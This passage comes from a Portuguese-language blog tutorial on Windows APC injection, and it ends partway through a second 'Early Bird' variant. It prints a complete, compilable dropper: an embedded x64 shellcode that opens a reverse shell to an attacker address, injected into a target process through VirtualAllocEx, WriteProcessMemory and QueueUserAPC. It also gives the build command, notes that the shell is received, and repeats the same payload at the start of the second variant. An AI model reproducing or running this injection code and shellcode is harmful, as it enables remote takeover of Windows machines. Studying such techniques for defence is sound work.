62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;tlhelp32.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;vector&gt;</span><span class="cp">
</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">payload</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x00\x49\x89\xe5\x49\xbc\x02\x00\x20\xfb\xc0\xa8\x47\x80</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5</span><span class="s">"</span><span class="p">;</span>

<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">);</span>

<span class="kt">int</span> <span class="nf">findPID</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">procName</span><span class="p">)</span> <span class="p">{</span>

    <span class="n">HANDLE</span> <span class="n">hSnapshot</span><span class="p">;</span>
    <span class="n">PROCESSENTRY32</span> <span class="n">pe32</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">BOOL</span> <span class="n">proc</span><span class="p">;</span>

    <span class="c1">// snapshot de todos os processos em execucao</span>
    <span class="n">hSnapshot</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPPROCESS</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">INVALID_HANDLE_VALUE</span> <span class="o">==</span> <span class="n">hSnapshot</span><span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>

    <span class="c1">// inicializando dwSize</span>
    <span class="n">pe32</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PROCESSENTRY32</span><span class="p">);</span>

    <span class="c1">// inicio da iteracao, primeiro processo</span>
    <span class="n">proc</span> <span class="o">=</span> <span class="n">Process32First</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe32</span><span class="p">);</span>

    <span class="c1">// loop para iterar sobre os processos</span>
    <span class="k">while</span> <span class="p">(</span><span class="n">proc</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">procName</span><span class="p">,</span> <span class="n">pe32</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">pid</span> <span class="o">=</span> <span class="n">pe32</span><span class="p">.</span><span class="n">th32ProcessID</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">proc</span> <span class="o">=</span> <span class="n">Process32Next</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe32</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// fecha o handle aberto</span>
    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">pid</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">DWORD</span> <span class="nf">getThIDs</span><span class="p">(</span><span class="n">DWORD</span> <span class="n">pid</span><span class="p">,</span> <span class="n">std</span><span class="o">::</span><span class="n">vector</span><span class="o">&lt;</span><span class="n">DWORD</span><span class="o">&gt;&amp;</span> <span class="n">thIds</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">HANDLE</span> <span class="n">thSnapshot</span><span class="p">;</span>
    <span class="n">THREADENTRY32</span> <span class="n">te</span><span class="p">;</span>
    <span class="n">te</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">THREADENTRY32</span><span class="p">);</span>

    <span class="n">thSnapshot</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPTHREAD</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">Thread32First</span><span class="p">(</span><span class="n">thSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">te</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">do</span> <span class="p">{</span>
            <span class="c1">// comparando o pid do processo com o pid do dono da thread</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">pid</span> <span class="o">==</span> <span class="n">te</span><span class="p">.</span><span class="n">th32OwnerProcessID</span><span class="p">)</span> <span class="p">{</span>
                <span class="c1">//caso positivo, adiciona o ID da thread no vetor</span>
                <span class="n">thIds</span><span class="p">.</span><span class="n">push_back</span><span class="p">(</span><span class="n">te</span><span class="p">.</span><span class="n">th32ThreadID</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">Thread32Next</span><span class="p">(</span><span class="n">thSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">te</span><span class="p">));</span>
    <span class="p">}</span>

    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">thSnapshot</span><span class="p">);</span>
    <span class="k">return</span> <span class="o">!</span><span class="n">thIds</span><span class="p">.</span><span class="n">empty</span><span class="p">();</span>
<span class="p">}</span>


<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">HANDLE</span> <span class="n">procH</span><span class="p">;</span> <span class="c1">// process handle</span>
    <span class="n">LPVOID</span> <span class="n">remoteB</span><span class="p">;</span> <span class="c1">// remote buffer</span>
    <span class="n">HANDLE</span> <span class="n">ht</span><span class="p">;</span> <span class="c1">// thread handle</span>
    <span class="n">std</span><span class="o">::</span><span class="n">vector</span><span class="o">&lt;</span><span class="n">DWORD</span><span class="o">&gt;</span> <span class="n">thIds</span><span class="p">;</span> <span class="c1">// vetor para os IDs das threads</span>

    <span class="n">pid</span> <span class="o">=</span> <span class="n">findPID</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>


    <span class="c1">// cria o handle para o processo</span>
    <span class="n">procH</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span><span class="n">PROCESS_ALL_ACCESS</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">DWORD</span><span class="p">(</span><span class="n">pid</span><span class="p">));</span>

    <span class="c1">// aloca o buffer de memoria no processo remoto</span>
    <span class="n">remoteB</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">procH</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="p">(</span><span class="n">MEM_RESERVE</span> <span class="o">|</span> <span class="n">MEM_COMMIT</span><span class="p">),</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>

    <span class="c1">// copia o payload entre os processos</span>
    <span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">procH</span><span class="p">,</span> <span class="n">remoteB</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

    <span class="c1">// iterando sobre os IDs das threads</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">getThIDs</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="n">thIds</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">for</span> <span class="p">(</span><span class="n">DWORD</span> <span class="n">thId</span> <span class="o">:</span> <span class="n">thIds</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">ht</span> <span class="o">=</span> <span class="n">OpenThread</span><span class="p">(</span><span class="n">THREAD_SET_CONTEXT</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">thId</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">ht</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">QueueUserAPC</span><span class="p">((</span><span class="n">PAPCFUNC</span><span class="p">)</span><span class="n">remoteB</span><span class="p">,</span> <span class="n">ht</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
                <span class="n">CloseHandle</span><span class="p">(</span><span class="n">ht</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">procH</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

</pre></table></code></div></div><p>Podemos compilar o programa:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>x86_64-w64-mingw32-g++ <span class="nt">-O2</span> dropper.cpp <span class="nt">-o</span> dropper.exe <span class="nt">-mconsole</span> <span class="nt">-s</span> <span class="nt">-ffunction-sections</span> <span class="nt">-fdata-sections</span> <span class="nt">-Wno-write-strings</span> <span class="nt">-fno-exceptions</span> <span class="nt">-fmerge-all-constants</span> <span class="nt">-static-libstdc</span>++ <span class="nt">-static-libgcc</span> <span class="nt">-fpermissive</span>
</pre></table></code></div></div><p>Agora podemos abrir uma instância de um notepad na máquina alvo e executar nosso programa.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240809230301.png" alt="" /></p><p>Na máquina atacante, recebemos o <em>reverse shell</em>.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240809230329.png" alt="" /></p><p>Uma particularidade sobre este processo, é que, como injetamos APC em todas as <em>threads</em> por não saber qual delas está em <em>alertable wait</em>, o <em>payload</em> é executado várias vezes, pois provavelmente existirão mais <em>threads</em> neste estado. Se analisarmos com o <em>Process Hacker</em>, veremos que o <em>payload</em> foi invocado várias vezes.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240809230612.png" alt="" /></p><h1 id="early-bird-apc-injection"><em>“Early Bird” APC injection</em></h1><p>No exemplo anterior, selecionamos um processo legítimo, enumeramos todas as suas <em>threads</em> e injetamos o APC em todas elas, esperando que pelo menos uma estivesse em estado <em>alertable wait</em>, uma vez que não existe uma forma de descobrir se uma <em>thread</em> destá de fato neste estado.</p><p>Outra técnica de <em>APC Injection</em> é o <em>Early bird</em> (esse nome fará sentido), onde, nosso próprio programa/<em>malware</em> cria um processo legítimo no Windows, porém em estado suspenso. Quando um processo é iniciado em estado suspenso, podemos manipular qualquer uma de suas <em>threads</em> inclusive a <em>main thread</em>, uma vez que esta foi manipulada para apontar para nosso <em>payload</em> podemos resumir o processo e nosso código será executado.</p><p>Para podermos criar um processo legítimo em estado suspenso, utilizaremos a função <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa">CreateProcessA</a> que tem a seguinte sintaxe:</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="n">BOOL</span> <span class="nf">CreateProcessA</span><span class="p">(</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span>      <span class="n">LPCSTR</span>                <span class="n">lpApplicationName</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">out</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span> <span class="n">LPSTR</span>                 <span class="n">lpCommandLine</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span>      <span class="n">LPSECURITY_ATTRIBUTES</span> <span class="n">lpProcessAttributes</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span>      <span class="n">LPSECURITY_ATTRIBUTES</span> <span class="n">lpThreadAttributes</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>                <span class="n">BOOL</span>                  <span class="n">bInheritHandles</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>                <span class="n">DWORD</span>                 <span class="n">dwCreationFlags</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span>      <span class="n">LPVOID</span>                <span class="n">lpEnvironment</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span>      <span class="n">LPCSTR</span>                <span class="n">lpCurrentDirectory</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>                <span class="n">LPSTARTUPINFOA</span>        <span class="n">lpStartupInfo</span><span class="p">,</span>
  <span class="p">[</span><span class="n">out</span><span class="p">]</span>               <span class="n">LPPROCESS_INFORMATION</span> <span class="n">lpProcessInformation</span>
<span class="p">);</span>
</pre></table></code></div></div><p>A maioria dos parâmetros desta função são irrelevantes para o <em>APC Injection</em>, porém dois deles são de extrema importância:</p><ul><li><code class="language-plaintext highlighter-rouge">[in, optional] lpApplicationName</code> o <em>path</em> do processo legítimo que queremos invocar;<li><code class="language-plaintext highlighter-rouge">[in] dwCreationFlags</code> onde definimos o estado de inicialização do processo.</ul><p>O Parâmetro <code class="language-plaintext highlighter-rouge">dwCreationFlags</code> segue uma <a href="https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags">tabela de referência</a> das <em>flags</em> que podem ser usadas, entre elas temos a <code class="language-plaintext highlighter-rouge">CREATE_SUSPENDED</code>:</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240812083753.png" alt="" /></p><p>Ao iniciarmos um processo com esta <em>flag</em>, sua <em>thread</em> principal permanece suspensa até que utilizemos a função <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread">ResumeThread</a> seja executada.</p><p>Outros 2 parâmetros obrigatórios para o funcionamento da função <code class="language-plaintext highlighter-rouge">CreateProcessA</code> são;</p><ul><li><code class="language-plaintext highlighter-rouge">[in] lpStartupInfo</code> um ponteiro para uma estrutura <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa">STARTUPINFOA</a> vazia que receberá informações sobre o estado de inicialização do processo;<li><code class="language-plaintext highlighter-rouge">[out] lpProcessInformation</code> um ponteiro para uma estrutura <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information">PROCESS_INFORMATION</a> vazia que receberá informações sobre o processo;</ul><p>A estrutura <code class="language-plaintext highlighter-rouge">PROCESS_INFORMATION</code> tem o seguinte formato:</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="k">typedef</span> <span class="k">struct</span> <span class="nc">_PROCESS_INFORMATION</span> <span class="p">{</span>
  <span class="n">HANDLE</span> <span class="n">hProcess</span><span class="p">;</span>
  <span class="n">HANDLE</span> <span class="n">hThread</span><span class="p">;</span>
  <span class="n">DWORD</span>  <span class="n">dwProcessId</span><span class="p">;</span>
  <span class="n">DWORD</span>  <span class="n">dwThreadId</span><span class="p">;</span>
<span class="p">}</span> <span class="n">PROCESS_INFORMATION</span><span class="p">,</span> <span class="o">*</span><span class="n">PPROCESS_INFORMATION</span><span class="p">,</span> <span class="o">*</span><span class="n">LPPROCESS_INFORMATION</span><span class="p">;</span>
</pre></table></code></div></div><p>Uma particularidade importante, é que o parâmetro <code class="language-plaintext highlighter-rouge">hThread</code> será inicializado com o ID da <em>main thread</em> quando o programa for inicializado em modo suspenso, ou seja, já teremos a identificação de onde enfileirar o APC.</p><p>Então, basicamente o fluxo é:</p><ol><li>Criar um processo legítimo em estado suspenso;<li>Criar um <em>buffer</em> dentro deste processo;<li>Copiar o <em>payload</em> para o <em>buffer</em>;<li>Enfileirar um APC na <em>main thread</em> que aponta para o <em>buffer</em>;<li>Resumir o processo.</ol><p>A implementação no código fica:</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">payload</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x00\x49\x89\xe5\x49\xbc\x02\x00\x20\xfb\xc0\xa8\x47\x80</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5</span><span class="s">"</span><span class="p">;</span>

<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">);</span>



<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
    <span class="n">STARTUPINFO</span> <span class="n">si</span><span class="p">;</span> <span class="c1">// criando estrutura STARTUPINFOA</span>
    <span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span><span class="p">;</span> <span class="c1">// criando estrutura PROCESS_INFORMATION</span>
    <span class="n">HANDLE</span> <span class="n">procH</span><span class="p">;</span> <span class="c1">// process handle</span>
    <span class="n">LPVOID</span> <span class="n">remoteB</span><span class="p">;</span> <span class="c1">// remote buffer</span>
    <span class="n">HANDLE</span> <span class="n">threadH</span><span class="p">;</span> <span class="c1">// thread handle</span>

    <span class="n">ZeroMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">si</span><span class="p">));</span> <span class="c1">// zerando estrutura STATUPINFOA</span>
    <span class="n">ZeroMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pi</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">pi</span><span class="p">));</span> <span class="c1">// zerando estrutura PROCESS_INFORMATION</span>
    <span class="n">si</span><span class="p">.</span><span class="n">cb</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">si</span><span class="p">);</span> <span class="c1">// inicializando STATUPINFOA</span>

    <span class="c1">// criando processo</span>
